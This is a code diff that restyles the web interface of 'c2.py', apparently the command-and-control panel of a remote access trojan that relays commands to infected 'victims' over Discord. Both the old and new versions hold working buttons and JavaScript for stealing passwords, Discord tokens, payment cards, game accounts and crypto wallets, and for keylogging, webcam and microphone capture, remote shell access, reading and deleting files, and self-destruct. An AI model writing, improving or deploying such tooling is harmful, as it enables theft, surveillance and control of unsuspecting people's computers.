@@ -1,6 +1,4 @@
-# c2.py – Ultimate C2 Panel (stunning modern UI)
-# Deploy on Render with env variables BOT_TOKEN, CHANNEL_ID
-
+# c2.py – Clean, modern C2 panel (no emoji spam)
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
 from flask_socketio import SocketIO
@@ -116,100 +114,92 @@ HTML = """
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>⚡ ULTIMATE C2 PANEL</title>
+    <title>C2 Panel</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0c10; font-family: 'Inter', sans-serif; color: #eef2ff; padding: 24px; }
+        body { background: #0b0e14; font-family: 'Inter', sans-serif; color: #eef2ff; padding: 24px; }
         .container { max-width: 1600px; margin: 0 auto; }
-        /* Header */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; flex-wrap: wrap; gap: 16px; }
-        h1 { font-size: 28px; font-weight: 700; background: linear-gradient(135deg, #ff6b6b, #ff8e53); -webkit-background-clip: text; background-clip: text; color: transparent; letter-spacing: -0.5px; }
-        .badge { background: #1e1e2e; padding: 8px 16px; border-radius: 40px; font-size: 13px; border: 1px solid #2a2a3c; }
-        /* Victims grid */
-        .victims-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-bottom: 32px; }
-        .victim-card { background: #13161f; border-radius: 20px; padding: 20px; border: 1px solid #252a36; transition: all 0.2s; cursor: pointer; }
-        .victim-card:hover { transform: translateY(-4px); border-color: #ff6b6b; box-shadow: 0 12px 24px -12px rgba(0,0,0,0.5); }
-        .victim-card.active { border: 2px solid #ff6b6b; background: #181e2a; }
-        .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
-        .victim-id { font-weight: 600; font-size: 15px; word-break: break-word; font-family: monospace; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; }
+        h1 { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(135deg, #a855f7, #ec4899); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .badge { background: #1e1f2c; padding: 6px 14px; border-radius: 40px; font-size: 13px; border: 1px solid #2a2b3a; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 32px; }
+        .card { background: #141824; border-radius: 24px; padding: 20px; border: 1px solid #252a36; transition: all 0.2s; cursor: pointer; }
+        .card:hover { border-color: #a855f7; transform: translateY(-2px); }
+        .card.active { border: 2px solid #a855f7; background: #1a1e2a; }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 12px; }
+        .victim-id { font-weight: 600; font-size: 14px; }
         .status { display: flex; align-items: center; gap: 8px; }
-        .status-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; }
         .online { background: #10b981; box-shadow: 0 0 6px #10b981; }
         .offline { background: #ef4444; }
-        .status-text { font-size: 12px; font-weight: 500; }
-        .last-seen { font-size: 11px; color: #6b7280; margin-top: 8px; }
-        /* Main panel */
-        .main-panel { display: flex; gap: 24px; flex-wrap: wrap; }
-        .controls { flex: 1.2; min-width: 320px; background: #13161f; border-radius: 24px; padding: 24px; border: 1px solid #252a36; }
-        .log { flex: 2; min-width: 400px; background: #13161f; border-radius: 24px; padding: 20px; height: 65vh; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 12px; }
-        .current-victim { background: #1e2432; border-radius: 40px; padding: 8px 16px; display: inline-block; margin-bottom: 20px; font-size: 13px; font-weight: 500; }
-        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 24px 0; }
-        button { background: #1e2432; border: none; color: #eef2ff; padding: 8px 16px; border-radius: 40px; cursor: pointer; transition: all 0.2s; font-size: 13px; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
-        button:hover { background: #ff6b6b; transform: scale(1.02); color: white; }
+        .time { font-size: 11px; color: #6b7280; }
+        .panel { display: flex; gap: 24px; flex-wrap: wrap; }
+        .controls { flex: 1.2; min-width: 300px; background: #141824; border-radius: 24px; padding: 24px; border: 1px solid #252a36; }
+        .logs { flex: 2; min-width: 400px; background: #141824; border-radius: 24px; padding: 20px; height: 65vh; overflow-y: auto; font-family: monospace; font-size: 12px; }
+        .current { background: #1e1f2c; border-radius: 40px; padding: 6px 16px; display: inline-block; margin-bottom: 20px; font-size: 13px; }
+        .btns { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; }
+        button { background: #1e1f2c; border: none; color: #eef2ff; padding: 8px 14px; border-radius: 40px; cursor: pointer; transition: 0.2s; font-size: 12px; font-weight: 500; }
+        button:hover { background: #a855f7; transform: scale(1.02); }
         .cmd-row { display: flex; gap: 12px; margin: 16px 0; }
-        .cmd-row input { flex: 1; background: #1e2432; border: 1px solid #2a3242; border-radius: 40px; padding: 10px 16px; color: white; outline: none; font-size: 13px; }
-        .cmd-row input:focus { border-color: #ff6b6b; }
-        .log p { margin: 8px 0; border-left: 3px solid #ff6b6b; padding-left: 12px; word-break: break-word; line-height: 1.5; }
-        .log pre { background: #0a0c10; padding: 10px; border-radius: 12px; overflow-x: auto; margin: 8px 0; font-size: 11px; }
-        footer { text-align: center; margin-top: 40px; font-size: 12px; color: #4b5563; }
-        @keyframes pulse { 0% { opacity: 0.6; } 100% { opacity: 1; } }
-        .pulse { animation: pulse 1.5s infinite; }
+        .cmd-row input { flex: 1; background: #1e1f2c; border: 1px solid #2a2b3a; border-radius: 40px; padding: 8px 16px; color: white; outline: none; }
+        .log-item { margin: 8px 0; border-left: 3px solid #a855f7; padding-left: 12px; word-break: break-word; }
+        footer { text-align: center; margin-top: 32px; font-size: 12px; color: #4b5563; }
         ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #1e2432; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb { background: #ff6b6b; border-radius: 10px; }
+        ::-webkit-scrollbar-track { background: #1e1f2c; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 10px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>⚡ ULTIMATE C2 PANEL</h1>
-        <div class="badge">🔗 Discord Relay | 🎯 Real‑time</div>
+        <h1>C2 PANEL</h1>
+        <div class="badge">Discord Relay</div>
     </div>
-    <div class="victims-grid" id="victimsGrid"></div>
-    <div class="main-panel">
+    <div class="grid" id="victimsGrid"></div>
+    <div class="panel">
         <div class="controls">
-            <div class="current-victim" id="currentVictim">⚠️ No victim selected</div>
-            <div class="button-group">
-                <button onclick="sendCmd('!info')">💻 Info</button>
-                <button onclick="sendCmd('!ip')">🌐 IP</button>
-                <button onclick="sendCmd('!clip')">📋 Clipboard</button>
-                <button onclick="sendCmd('!active')">🪟 Active</button>
-                <button onclick="sendCmd('!wifi')">📶 Wi-Fi</button>
-                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
-                <button onclick="sendCmd('!passwords')">🔑 Passwords</button>
-                <button onclick="sendCmd('!cards')">💳 Cards</button>
-                <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
-                <button onclick="sendCmd('!steam')">🎮 Steam</button>
-                <button onclick="sendCmd('!wallets')">💰 Wallets</button>
-                <button onclick="sendCmd('!history')">📜 History</button>
-                <button onclick="sendCmd('!emails')">📧 Emails</button>
-                <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
-                <button onclick="sendCmd('!webcam')">🎥 Webcam</button>
-                <button onclick="sendCmd('!mic')">🎙️ Mic</button>
-                <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
-                <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
-                <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
-                <button onclick="sendCmd('!processes')">📊 Processes</button>
-                <button onclick="sendCmd('!shell')">🐚 Shell Start</button>
-                <button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button>
-                <button onclick="sendCmd('!lock')">🔒 Lock</button>
-                <button onclick="sendCmd('!shutdown')">⏻ Shutdown</button>
-                <button onclick="sendCmd('!restart')">⟳ Restart</button>
-                <button onclick="sendCmd('!abort')">⚠️ Abort</button>
-                <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
-                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self-Destruct</button>
-                <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit RAT</button>
+            <div class="current" id="currentVictim">No victim selected</div>
+            <div class="btns">
+                <button onclick="send('!info')">Info</button>
+                <button onclick="send('!ip')">IP</button>
+                <button onclick="send('!clip')">Clipboard</button>
+                <button onclick="send('!active')">Active</button>
+                <button onclick="send('!wifi')">Wi-Fi</button>
+                <button onclick="send('!tokens')">Discord</button>
+                <button onclick="send('!passwords')">Passwords</button>
+                <button onclick="send('!cards')">Cards</button>
+                <button onclick="send('!roblox')">Roblox</button>
+                <button onclick="send('!steam')">Steam</button>
+                <button onclick="send('!wallets')">Wallets</button>
+                <button onclick="send('!history')">History</button>
+                <button onclick="send('!emails')">Emails</button>
+                <button onclick="send('!screenshot')">Screenshot</button>
+                <button onclick="send('!webcam')">Webcam</button>
+                <button onclick="send('!mic')">Mic</button>
+                <button onclick="send('!keylog_start')">Keylog Start</button>
+                <button onclick="send('!keylog_stop')">Stop</button>
+                <button onclick="send('!keylog_dump')">Dump</button>
+                <button onclick="send('!processes')">Processes</button>
+                <button onclick="send('!shell')">Shell Start</button>
+                <button onclick="send('!shell_stop')">Shell Stop</button>
+                <button onclick="send('!lock')">Lock</button>
+                <button onclick="send('!shutdown')">Shutdown</button>
+                <button onclick="send('!restart')">Restart</button>
+                <button onclick="send('!abort')">Abort</button>
+                <button onclick="send('!all')">All Data</button>
+                <button onclick="send('!selfdestruct')" style="background:#8b0000;">Self-Destruct</button>
+                <button onclick="send('!exit')" style="background:#8b0000;">Exit</button>
             </div>
-            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir or !shell command"><button onclick="sendCustom()">▶️ Run</button></div>
-            <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="sendCmd('!cat '+catPath.value)">Read</button></div>
-            <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="sendCmd('!rm '+rmPath.value)">Delete</button></div>
-            <div class="cmd-row"><input id="lsPath" placeholder="!ls path (default C:\\)"><button onclick="sendCmd('!ls '+lsPath.value)">List</button></div>
+            <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir"><button onclick="sendCustom()">Run</button></div>
+            <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="send('!cat '+catPath.value)">Read</button></div>
+            <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="send('!rm '+rmPath.value)">Delete</button></div>
+            <div class="cmd-row"><input id="lsPath" placeholder="!ls path"><button onclick="send('!ls '+lsPath.value)">List</button></div>
         </div>
-        <div class="log" id="logPanel"></div>
+        <div class="logs" id="logsPanel"></div>
     </div>
-    <footer>⚡ All commands sent via Discord bot | Results appear here in real time</footer>
+    <footer>Commands are sent via Discord. Results appear here.</footer>
 </div>
 <script>
     const socket = io();
@@ -218,10 +208,10 @@ HTML = """
 
     socket.on('new_log', (data) => {
         if (data.victim === currentVictim) addLog(data.log);
-        refreshVictims();
+        refresh();
     });
 
-    function refreshVictims() {
+    function refresh() {
         fetch('/api/victims').then(r=>r.json()).then(data => {
             victims = {};
             const grid = document.getElementById('victimsGrid');
@@ -229,66 +219,61 @@ HTML = """
             data.forEach(v => {
                 victims[v.id] = v;
                 const card = document.createElement('div');
-                card.className = `victim-card ${currentVictim === v.id ? 'active' : ''}`;
+                card.className = `card ${currentVictim === v.id ? 'active' : ''}`;
                 card.innerHTML = `
-                    <div class="victim-header">
+                    <div class="card-header">
                         <span class="victim-id">${v.id}</span>
-                        <div class="status"><span class="status-dot ${v.online ? 'online' : 'offline'}"></span><span class="status-text">${v.online ? 'ONLINE' : 'OFFLINE'}</span></div>
+                        <div class="status"><span class="dot ${v.online ? 'online' : 'offline'}"></span><span>${v.online ? 'ONLINE' : 'OFFLINE'}</span></div>
                     </div>
-                    <div class="last-seen">📅 Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
+                    <div class="time">Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
                 `;
-                card.onclick = () => selectVictim(v.id);
+                card.onclick = () => select(v.id);
                 grid.appendChild(card);
             });
             if (currentVictim && victims[currentVictim]) {
-                document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${currentVictim}`;
+                document.getElementById('currentVictim').innerHTML = `Target: ${currentVictim}`;
             } else if (data.length > 0 && !currentVictim) {
-                selectVictim(data[0].id);
+                select(data[0].id);
             } else if (!currentVictim) {
-                document.getElementById('currentVictim').innerHTML = '⚠️ No victims online';
+                document.getElementById('currentVictim').innerHTML = 'No victims online';
             }
         });
     }
 
-    function selectVictim(victimId) {
-        currentVictim = victimId;
-        document.getElementById('currentVictim').innerHTML = `🎯 Controlling: ${victimId}`;
-        fetch(`/api/logs/${victimId}`).then(r=>r.json()).then(logs => {
-            const panel = document.getElementById('logPanel');
+    function select(id) {
+        currentVictim = id;
+        document.getElementById('currentVictim').innerHTML = `Target: ${id}`;
+        fetch(`/api/logs/${id}`).then(r=>r.json()).then(logs => {
+            const panel = document.getElementById('logsPanel');
             panel.innerHTML = '';
             logs.forEach(log => addLog(log));
         });
-        refreshVictims();
+        refresh();
     }
 
     function addLog(msg) {
-        const panel = document.getElementById('logPanel');
-        const p = document.createElement('p');
-        p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        panel.appendChild(p);
-        p.scrollIntoView();
+        const panel = document.getElementById('logsPanel');
+        const div = document.createElement('div');
+        div.className = 'log-item';
+        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        panel.appendChild(div);
+        div.scrollIntoView();
     }
 
-    function sendCmd(cmd) {
-        if (!currentVictim) { alert('Select a victim first'); return; }
-        fetch('/send', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({victim: currentVictim, command: cmd})
-        }).then(r=>r.json()).then(data => {
-            if (data.success) addLog(`> ${cmd} (sent)`);
-            else addLog(`❌ Failed: ${data.error}`);
-        });
+    function send(cmd) {
+        if (!currentVictim) { alert('Select a victim'); return; }
+        fetch('/send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({victim: currentVictim, command: cmd}) })
+            .then(r=>r.json()).then(data => { if (data.success) addLog(`> ${cmd} (sent)`); else addLog(`Failed: ${data.error}`); });
     }
 
     function sendCustom() {
         let cmd = document.getElementById('customCmd').value.trim();
-        if (cmd) sendCmd(cmd);
+        if (cmd) send(cmd);
         document.getElementById('customCmd').value = '';
     }
 
-    setInterval(refreshVictims, 5000);
-    refreshVictims();
+    setInterval(refresh, 5000);
+    refresh();
 </script>
 </body>
 </html>
